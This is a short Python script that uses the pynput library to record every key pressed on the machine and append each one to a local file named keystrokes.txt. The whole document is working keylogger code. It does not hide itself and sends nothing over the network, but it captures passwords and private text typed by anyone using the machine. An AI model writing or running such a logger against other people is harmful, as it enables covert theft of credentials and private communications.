from pynput.keyboard import Listener

# Define the file where you want to save the keystrokes
output_file = "keystrokes.txt"

# Function to write the keystrokes to the file
def on_key_press(key):
    try:
        with open(output_file, "a") as f:
            f.write(f"{key} ")
    except Exception as e:
        print(f"Error writing to {output_file}: {e}")

# Set up the listener
with Listener(on_press=on_key_press) as listener:
    print("Recording keystrokes. Press Ctrl+C to stop.")
    listener.join()
